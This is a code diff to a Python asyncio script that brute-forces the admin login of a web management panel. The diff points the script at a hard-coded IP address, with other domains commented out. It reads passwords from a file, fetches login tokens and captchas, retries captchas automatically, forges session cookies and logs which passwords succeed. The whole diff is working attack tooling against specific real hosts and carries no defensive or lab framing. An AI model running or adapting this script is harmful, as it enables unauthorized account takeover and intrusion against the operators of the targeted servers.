@@ -12,8 +12,8 @@ from logger import MyLogger
 
 base_captcha = "captcha"
 
-base_url = "http://www.ximimim.top:1008"
-# base_url = "https://154.91.255.180"
+# base_url = "http://www.ximimim.top:1008"
+base_url = "https://154.91.255.180"
 # base_url = "http://www.bmavi.top"
 # base_url = "https://facai362.top"
 route_login = "/admin/common/login.shtml"
@@ -29,7 +29,7 @@ session_request.headers = {
 }
 
 # 信号量控制并发数量
-semaphore = asyncio.Semaphore(50)
+semaphore = asyncio.Semaphore(10)
 ACCOUNT_FILE_NAME = "account.txt"
 # 获取文件最多行数
 FILE_NUM_LINES = 10
@@ -134,7 +134,7 @@ async def login_attack(session: aiohttp.ClientSession, login: common.LoginInfo):
     param = "name={0}&password={1}&captcha={2}&__token__={3}".format(login.username,
                                                                      login.password, login.captcha, login.token)
 
-    print("请求参数", param)
+    # print("请求参数", param)
     header = {
         'X-Requested-With': 'XMLHttpRequest',
         'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
@@ -151,13 +151,13 @@ async def login_attack(session: aiohttp.ClientSession, login: common.LoginInfo):
 
 
 # 协程函数
-async def async_craw(url):
+async def async_craw(row, password):
     async with semaphore:
         try:
             # 部分https地址无法自动设置cookie 需要手动设置一下
             # header = {'Cookie': 'PHPSESSID=vj82u5m4j1nt7l7fo813rg1781'}
             # 是否进行手动设置Cookie
-            cookies = aiohttp_cookies if IS_COOKIE else None
+            cookies = {'PHPSESSID': common.create_random_26()} if IS_COOKIE else None
             # 如果是https链接 读取配置进行是否忽略ssl证书校验
             connector = aiohttp.TCPConnector(verify_ssl=False) if IS_VERIFY_SSL else None if IS_HTTPS else None
             # 是否进行socks5代理
@@ -169,27 +169,33 @@ async def async_craw(url):
             # connector = aiohttp.Connector.combine(tcp_connector, socks5_connector)
             # tcp_connector = aiohttp.TCPConnector(ssl=False, verify_ssl=False, limit=None, proxy=socks5_connector)
             async with aiohttp.ClientSession(connector=connector, cookies=cookies) as session:
-                print('获取数据中...........')
+                # print('获取数据中...........')
                 # 获取登录地址中的token
                 token = await login_token(session)
-                print(token)
+                # print(token)
                 captcha = await get_captcha_code(session)
-                print("captcha_code=", captcha)
+                # print("captcha_code=", captcha)
                 # 构造信息
                 login_info = common.LoginInfo()
-                login_info.full_property_data("admin", "123456", token, captcha)
+                login_info.full_property_data("admin", password, token, captcha)
                 res_dict = await login_attack(session, login_info)  # 登录数据返回结果
                 login_resp = common.LoginResponse()
                 # 返回结果反射到LoginResponse属性中
                 common.dict_to_obj(res_dict, login_resp)
-                print(res_dict)
+                # print(res_dict)
                 # 校验验证码错误 尝试再次登录
                 # login_resp.msg = "验证码不正确"
                 captcha_record_nums = 1  # 记录验证码获取计词
+                # 日志记录对象
+                log_extra = {'username': login_info.username, 'password': login_info.password}
                 if "验证码不正确" in login_resp.msg:
-                    await login_attempt(session, login_info, login_resp, captcha_record_nums)
+                    await login_attempt(session, login_info, login_resp, captcha_record_nums, row)
                 else:
-                    pass
+                    if "密码错误" in login_resp.msg:
+                        await my_logger.warning(f'该账号密码错误,所在文件第{row}行', log_extra)
+                    else:
+                        if login_resp.code == 1:
+                            await my_logger.info(f'登录成功,该密码所在文件第{row}行', log_extra)
                 # await asyncio.sleep(5)  # 等待五秒
                 # if "验证码不正确" in login_resp.msg:
                 #     # 只允许限定次数内重新获取验证码 5 <= 100
@@ -213,7 +219,8 @@ async def async_craw(url):
 
 # 尝试登录多次
 async def login_attempt(session: aiohttp.ClientSession, login_info: common.LoginInfo, login_resp: common.LoginResponse,
-                        captcha_record_nums):
+                        captcha_record_nums, file_row_number):
+    log_extra = {'username': login_info.username, 'password': login_info.password}
     if "验证码不正确" in login_resp.msg:
         # 只允许限定次数内重新获取验证码 5 <= 100
         if captcha_record_nums <= ATTEMPT_NUM:
@@ -225,12 +232,17 @@ async def login_attempt(session: aiohttp.ClientSession, login_info: common.Login
             # 重新设置验证码
             login_info.set_captcha(captcha)
             res_dict = await login_attack(session, login_info)  # 登录数据返回结果
-            print(res_dict)
+            # print(res_dict)
             common.dict_to_obj(res_dict, login_resp)
-            return await login_attempt(session, login_info, login_resp, captcha_record_nums)
+            return await login_attempt(session, login_info, login_resp, captcha_record_nums, file_row_number)
         else:
-            await my_logger.warning(f'该账号已超过获取{ATTEMPT_NUM}次验证码,直接返回', {'username': login_info.username,
-                                                                        'password': login_info.password})
+            await my_logger.warning(f'该账号已超过获取{ATTEMPT_NUM}次验证码,直接返回', log_extra)
+    else:
+        if "密码错误" in login_resp.msg:
+            await my_logger.warning(f'该账号密码错误,所在文件第{file_row_number}行', log_extra)
+        else:
+            if login_resp.code == 1:
+                await my_logger.info(f'登录成功,该密码所在文件第{file_row_number}行', log_extra)
 
 
 def start_task():
@@ -247,18 +259,27 @@ def start_task():
 
 
 def start_file_account():
+    start = time.time()
+    tasks = []
+    loop = asyncio.get_event_loop()
     with open(ACCOUNT_FILE_NAME, "r") as f:
         for i in range(FILE_NUM_LINES):
-            p = f.readline().strip()
-            print(p)
+            password = f.readline().strip()
+            task = loop.create_task(async_craw(i + 1, password))
+            tasks.append(task)
+    # 等待所有的任务完成
+    loop.run_until_complete(asyncio.wait(tasks))
+    end = time.time()
+    print("协程 async 总耗时:", end - start, "seconds")
 
 
 def main():
     # 获取平台登陆地址
-    # my_logger.warning(f'该账号已超过获取{ATTEMPT_NUM}次验证码,直接返回', {'username': 'admin', 'password': '123456'})
+    # my_logger.info(f'该账号已超过获取{ATTEMPT_NUM}次验证码,直接返回', {'username': 'admin', 'password': '123456'})
     # return
     print("平台登陆地址", base_url + route_login)
-    start_task()
+    start_file_account()
+    # start_task()
 
 
 if __name__ == "__main__":
